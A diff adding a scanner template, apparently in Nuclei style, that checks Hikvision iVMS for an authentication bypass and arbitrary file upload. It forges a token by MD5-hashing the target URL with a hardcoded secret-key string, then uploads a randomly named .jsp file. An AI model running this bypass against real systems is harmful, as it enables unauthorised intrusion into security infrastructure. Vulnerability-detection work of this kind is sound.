@@ -1,0 +1,33 @@
+id: hikvision-ivms-file-upload-bypass
+brief:
+    title: Hikvison iVMS - File Upload Bypass
+    by: SleepingBag945
+    level: critical
+    about: Hikvision iVMS integrated security system has a vulnerability that allows arbitrary file uploads. Attackers can exploit this vulnerability by obtaining the encryption key to create a forged token. ...
+    label:
+        - hikvision
+        - ivms
+        - intrusive
+        - fileupload
+        - auth-bypass
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/eps/api/resourceOperations/upload?token={{to_upper(md5(concat("{{RootURL}}","/eps/api/resourceOperations/uploadsecretKeyIbuilding")))}}'
+      head:
+        Content-Type: multipart/form-data;boundary=----WebKitFormBoundaryGEJwiloiPo
+      body: |-
+        ------WebKitFormBoundaryGEJwiloiPo
+        Content-Disposition: form-data; name="fileUploader";filename="{{randstr}}.jsp"
+        Content-Type: image/jpeg
+
+        {{randstr}}
+        ------WebKitFormBoundaryGEJwiloiPo%20
+      signs:
+        - "on": word
+          has:
+            - '"success":true'
+            - '"resourceName":'
+          in: body
+          need: all
